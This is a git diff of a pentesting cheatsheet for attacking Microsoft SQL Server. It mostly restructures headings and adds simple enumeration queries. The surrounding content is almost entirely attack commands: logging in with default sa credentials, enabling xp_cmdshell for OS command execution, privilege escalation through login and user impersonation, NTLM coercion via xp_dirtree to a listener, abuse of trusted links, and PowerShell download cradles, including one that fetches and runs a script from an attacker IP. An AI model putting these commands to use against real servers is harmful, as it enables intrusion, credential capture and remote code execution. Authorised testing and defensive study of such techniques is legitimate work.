@@ -35,7 +35,30 @@ python3 mssqlclient.py -windows-auth domain.com/username:Password@sqlserver.doma
 python3 mssqlclient.py -windows-auth sa:sa@sqlserver.domain.com
 ```
 
-## Execute as login
+## MSSQL Cheatsheet
+
+### List DBs
+
+```bash
+enum_db
+```
+
+### List tables 
+
+```bash
+USE <db>;
+SELECT name FROM sys.tables;
+```
+
+### Show info
+
+```bash
+select * from <table>;
+```
+
+## Privesc
+
+### Execute as login
 
 ```bash
 enum_logins
@@ -44,7 +67,7 @@ enable_xp_cmdshell
 xp_cmdshell whoami
 ```
 
-## Execute as user
+### Execute as user
 
 ```bash
 enum_users
@@ -60,13 +83,13 @@ enable_xp_cmdshell
 xp_cmdshell whoami
 ```
 
-## Coerce
+### Coerce
 
 ```bash
 exec master.sys.xp_dirtree '\\listenerIP\test',1,1
 ```
 
-## Trusted links
+### Trusted links
 
 ```bash
 enum_links
@@ -75,7 +98,7 @@ enable_xp_cmdshell
 xp_cmdshell whoami
 ```
 
-## Command Execution
+### Command Execution
 
 ```python
 #!/usr/bin/env python
@@ -112,9 +135,9 @@ xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.
 crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
 ```
 
-## PowerUpSQL
+### PowerUpSQL
 
-### Import
+#### Import
 
 ```powershell
 Import-Module .\PowerUpSQL.ps1
@@ -122,7 +145,7 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubuserconte
 &([scriptblock]::Create((new-object net.webclient).downloadstring("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")))
 ```
 
-### Commands
+#### Commands
 
 ```bash
 Get-SQLInstanceLocal -Verbose
